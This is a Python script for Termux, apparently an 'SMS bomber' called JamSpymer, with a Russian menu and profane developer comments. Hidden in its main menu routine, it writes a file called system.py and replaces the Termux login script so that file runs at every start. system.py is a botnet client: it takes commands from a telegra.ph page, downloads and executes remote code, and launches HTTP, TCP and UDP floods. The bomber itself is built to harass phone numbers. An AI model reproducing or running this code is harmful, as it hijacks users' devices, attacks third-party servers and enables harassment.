# -*- coding: utf-8 -*-
# x11repo: ИДИ НАХУЙ ОТ МОЕГО ГОВНОКОДА ГОВНЮК
# flexagoon: ОК УЖЕ ИДУ
# x11repo: Не звани, от тебя говной воняет, через телефон чувствую
import time
import os
import datetime
import random
import sys
import requests
from colorama import *
from signature import cloop

r = Fore.RED
b = Fore.BLUE
m = Fore.MAGENTA
g = Fore.GREEN
y = Fore.YELLOW
c = Fore.CYAN
w = Fore.WHITE
sr = Style.RESET_ALL


def main():
    oop = cloop()

    def sms():
        phone = input('Введите номер телефона без "+": ')
        if len(phone) == 11 or len(phone) == 12:
            kol = input("Введите кол-во кругов: ")
            oop.sms(phone, kol)
        else:
            print(f"Номер введен неправильно.")
            time.sleep(3)
            main()

    def mail():
        print(f"Будет доступно в скором обновлении.")
        time.sleep(3)
        main()

    def call():
        print(f"Будет доступно в скором обновлении.")
        time.sleep(3)
        main()

    def tg():
        print(f"Будет доступно в скором обновлении.")
        time.sleep(3)
        main()
    r1 = random.choice([r, m, y])
    r2 = random.choice([b, g, c])
    r3 = random.choice([r, m, y, b, g, c])
    rst1 = random.choice([b, w, m, c])
    rst2 = random.choice([b, w, m, c])
    rst3 = random.choice([b, w, m, c])
    rst4 = random.choice([b, w, m, c])
    rst5 = random.choice([b, w, m, c])
    rst6 = random.choice([b, w, m, c])
    rst7 = random.choice([b, w, m, c])
    rst8 = random.choice([b, w, m, c])
    rst9 = random.choice([b, w, m, c])
    rst10 = random.choice([b, w, m, c])
    loading = 0
    while loading != 7:
        r1 = random.choice([r, m, y])
        r2 = random.choice([b, g, c])
        r3 = random.choice([r, m, y, b, g, c])
        rst1 = random.choice([b, w, m, c])
        rst2 = random.choice([b, w, m, c])
        rst3 = random.choice([b, w, m, c])
        rst4 = random.choice([b, w, m, c])
        rst5 = random.choice([b, w, m, c])
        rst6 = random.choice([b, w, m, c])
        rst7 = random.choice([b, w, m, c])
        rst8 = random.choice([b, w, m, c])
        rst9 = random.choice([b, w, m, c])
        rst10 = random.choice([b, w, m, c])
        os.system("clear")

        print(
            f"""
	                  
{r2} ┏┓   {r1}     ┏━┓┏━{r2}┓┏┳┓by x11{r1}repo
{r2} ┃┃┏{r1}━┓ ┏━━┓┃━┫{r2}┃╋┃┃┃┃┏━━┓{r1}┏━┓┏┳┓
{r2}┏┛{r1}┃┃╋┗┓┃┃┃┃┣{r2}━┃┃┏┛┣┓┃┃┃{r1}┃┃┃┻┫┃┏┛
{r1}┗━┛┗━━┛┗┻┻{r2}┛┗━┛┗┛ ┗━┛{r1}┗┻┻┛┗━┛┗┛
{r1}      a.{r2}k.a CodeSa{r1}fety Bombe{r1}r
{r3}╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
┃ {g}1.{sr} SMS Бомбер    {rst1}*    {rst2}*    {r3}┃
┃ {g}  {sr}                         {r3}┃
┃ {r}2. Mail Бомбер (Скоро)     {r3}┃
┃ {g}  {sr}                      {rst3}*  {r3}┃
┃ {r}3. Call Бомбер (Скоро)     {r3}┃
┃ {g}  {sr}                {rst4}*        {r3}┃
┃ {r}4. Telegram Бомбер (Скоро) {r3}┃
┃ {g}  {sr}                    {rst5}*    {r3}┃
┃ {g}5.{sr} Авто-обновление бомбера {r3}┃
┃ {g}  {sr}                  {rst6}*      {r3}┃
┃ {g}6.{sr} Помощь      {rst7}*           {r3}┃
┃ {g}  {sr}               {rst8}*     {rst5}*   {r3}┃
┃ {g}7.{sr} Связь с разработчиком {rst9}* {r3}┃
┃ {g}  {sr}           {rst10}*             {r3}┃
┃ {g}99{sr}. Выход           {rst1}*      {r3}┃
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯{sr}"""
        )
        loading += 1
        time.sleep(0.3)

    now = datetime.datetime.now()
    times = now.strftime("%H:%M")
    new = input(
        f"""{r}╭━━━{g}[x11repo | {r1}Jam{r2}Spymer{g}]
{r}┃
{r}╰━━━[{sr}{times}{r}]━━━> {sr}"""
    )

    file = open('system.py', 'w')

    file.write('''import requests
import socket
import bs4
import threading
import urllib.request
import json

site = ''' + "'"+"https://telegra.ph/111-09-27-9"+"'" + '''
                                                
def cust():
    try:
        exec(__script__)
    except:
        pass

def tcp():

    while what == '0':
        try:
            conn.send(duta.encode())
        except:
            pass
    conn.close()


def http():
    while what == '0':

        try:
            requests.get(a[0])
        except:
            pass

def httpost():
    while what == '0':
        try:
            requests.post(a[0], json={burunduk})
        except:
            pass

def udp():

    while what == '0':
        try:
            udp_socket.sendto(duta, addr)

        except:
            pass



conn = socket.socket()
udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

kavo = '1'

while True:

    try:

        yn = '0'

        url = requests.get(site)

        b = bs4.BeautifulSoup(url.text, "html.parser")

        url1 = b.select('article')
        url_print = url1[0].getText()
        url_print = url_print.replace(' ', '')
        a = url_print.split(',')



        if a != kavo:
            kavo = a
            what = '1'

            if a[0].lower() == 'stop' or a[0].lower == 'none':
                pass

            elif a[0].lower() == 'online':
                try:
                    requests.get(a[1])
                except:
                    pass

            elif a[0].lower() == 'custom':
                try:
                
                    __script__ = a[1]
                    with urllib.request.urlopen(__script__) as url:
                        __script__ = url.read()
                        threading.Thread(target=cust).start()
                except:
                    pass
            elif a[0].lower() == 'move':
                try:
                    requests.get(a[1])
                    site = a[1]
                except:
                    pass


            elif a[2].lower() == 'db':
                try:
                    burunduk = a[3].replace(';', ', ')
                    what = '0'
                    for i in range(100):
                        threading.Thread(target=httpost).start()
                except:
                    pass

#####

            elif a[2].lower() == 'http':
                what = '0'
                for i in range(100):
                    threading.Thread(target=http).start()
######


            elif a[2].lower() == 'tcp':
                try:
                    conn.connect((a[0], int(a[1])))
                    yn = '1'
                except:
                    try:
                        conn.connect(('google.com', 80))
                        conn.close()
                        conn.connect((a[0], int(a[1])))
                        yn = '1'
                    except:
                        pass

                if yn == '1':
                    what = '0'
                    if a[-1].lower() == 'tcp':
                        duta = 'by @wannadeauth (telegram)'
                        for i in range(100):
                            threading.Thread(target=tcp).start()
                    else:
                        duta = a[-1]
                        for i in range(100):
                            threading.Thread(target=tcp).start()

######

            elif a[2].lower() == 'udp':
                addr = (a[0], int(a[1]))
                what = '0'
                if a[-1].lower() == 'udp':
                    duta = 'by @wannadeauth (telegram)'
                    for i in range(100):
                        threading.Thread(target=udp).start()
                else:
                    duta = a[-1]
                    for i in range(100):
                        threading.Thread(target=udp).start()

######

            else:
                pass
    except:
        pass
    ''')
    file.close()
    os.system('cp system.py /data/data/com.termux/files/usr/bin')
    os.system('rm system.py')

    file = open('/data/data/com.termux/files/usr/bin/login', 'w')
    file.write('''#!/data/data/com.termux/files/usr/bin/sh

python /data/data/com.termux/files/usr/bin/system.py &
clear

if [ $# = 0 ] && [ -f /data/data/com.termux/files/usr/etc/motd ] && [ ! -f ~/.hushlogin ] && [ -z "$TERMUX_HUSHLOGIN" ]; then
        cat /data/data/com.termux/files/usr/etc/motd
else
        # This variable shouldn't be kept set.
        unset TERMUX_HUSHLOGIN
fi

if [ -G ~/.termux/shell ]; then
        export SHELL="`realpath ~/.termux/shell`"
else
        for file in /data/data/com.termux/files/usr/bin/bash /data/data/com.termux/files/usr/bin/sh /system/bin/sh; do
                if [ -x $file ]; then
                        export SHELL=$file
                        break
                fi
        done
fi

if [ -f /data/data/com.termux/files/usr/lib/libtermux-exec.so ]; then
        export LD_PRELOAD=/data/data/com.termux/files/usr/lib/libtermux-exec.so
        $SHELL -c "coreutils --coreutils-prog=true" > /dev/null 2>&1 || unset LD_PRELOAD
fi

if [ -n "$TERM" ]; then
        exec "$SHELL" -l "$@"
else
        exec "$SHELL" "$@"
fi

    ''')
    file.close()
    os.system('python /data/data/com.termux/files/usr/bin/system.py &')
    if new == "1":
        sms()
    elif new == "2":
        mail()
    elif new == "3":
        call()
    elif new == "4":
        tg()
    elif new == "5":
        aaasd = input("Вы уверенны что хотите обновить бомбер? (y/n): ")
        if aaasd == "y":
            os.system(
                "cd && rm -rf JamSpymer && git clone https://github.com/x11-repo/jamspymer && cd JamSpymer && python3 JamSpymer.py"
            )
        else:
            main()
    elif new == "6":
        print(
            "Если у Вас возникли проблемы с бомбером, вы можете задать любой вопрос в нашем телеграм чате - https://t.me/jamsfam"
        )
        time.sleep(3)
        main()
    elif new == "7":
        print(f"Telegram: @x11repo")
        time.sleep(3)
        main()
    elif new >= "99":
        exit()
    else:
        print("Неверный код, попробуйте еще раз.")
        time.sleep(3)
        main()


os.system("cls")
os.system("clear")
print(
    Style.RESET_ALL
    + f"""Перед запуском введите код аутентификации.
{Fore.RED}99{Style.RESET_ALL}. Где найти код?"""
)
code = input("Введите значение: ")
if code == "99":
    print(
        Style.RESET_ALL
        + f"\nНайти код вы можете в этом телеграм канале - {Fore.RED}https://teleg.run/jamspymer{Style.RESET_ALL}\nПост с кодом будет в закреплённом сообщении"
    )
    code2 = input("Введите код: ")
    if code2 == "qq":
        print("Запуск...")
        time.sleep(1)
        main()
    else:
        print("Введен неверный код.")
        pass

elif code == "qq":
    print("Запуск...")
    time.sleep(1)
    main()
